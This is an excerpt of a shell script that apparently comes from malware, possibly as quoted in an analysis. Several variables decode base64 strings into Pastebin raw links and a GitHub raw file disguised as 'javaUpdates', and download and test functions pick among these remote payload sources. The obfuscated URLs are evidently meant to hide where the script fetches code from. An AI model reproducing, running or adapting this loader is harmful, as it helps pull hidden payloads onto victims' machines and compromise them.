...
house=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzZyZllWMWFTCg==|base64 -d)
room=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NnUzd4RTVXCg==|base64 -d)
park=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0dudzRnVEN2Cg==|base64 -d)
beam=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1MzWVlheng5Cg==|base64 -d)
deep=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3Frbk5YYm1qCg==|base64 -d)
surf=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2hiblFZanpxCg==|base64 -d)
me=$( whoami )
...
function download() {
	...
	if [ ${pa} -eq 0 ];then
		mi_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3N5Nzk3OHN5L1dlaVJlcG9zaXRvcnkvcmF3L21hc3Rlci9qYXZhVXBkYXRlcw==|base64 -d)
...
function testa() {
	...
	if [ ${pb} -eq 0 ];then
		st_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3N5Nzk3OHN5L1dlaVJlcG9zaXRvcnkvcmF3L21hc3Rlci9qYXZhVXBkYXRlcw==|base64 -d)
